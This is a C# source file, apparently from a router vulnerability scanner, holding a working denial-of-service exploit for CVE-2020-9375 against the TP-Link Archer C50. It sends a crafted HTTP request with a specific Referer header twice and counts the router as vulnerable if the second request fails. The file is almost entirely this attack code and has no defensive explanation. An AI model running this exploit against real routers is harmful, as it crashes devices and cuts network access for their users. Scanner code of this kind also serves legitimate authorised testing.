namespace Away.App.Domain.RouterScanner.VulHub;

/// <summary>
/// TP-Link Archer C50 3 - 拒绝服务
/// <br/><see cref="https://www.exploit-db.com/exploits/48255"/>
/// </summary>
[DI(Constant.VulHubKey)]
public sealed class CVE_2020_9375 : RouterVulHubBase<CVE_2020_9375>, IRouterVulHub
{
    public string CVE => "CVE_2020_9375";
    public string VulType => "拒绝服务";
    public string Production => "TP-Link";
    public List<string> Version => ["Archer C50"];


    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var resp = await Request(cancellationToken);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        resp = await Request(cancellationToken);
        if (!resp.IsSuccessStatusCode)
        {
            return OK();
        }
        return OK(false);
    }

    private Task<HttpResponseMessage> Request(CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            GET / HTTP/1.1
            Host: {Host}
            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
            Referer: thewhiteh4t

            """;
        return Http.SendAsync(rawText, SSL, cancellationToken);
    }
}
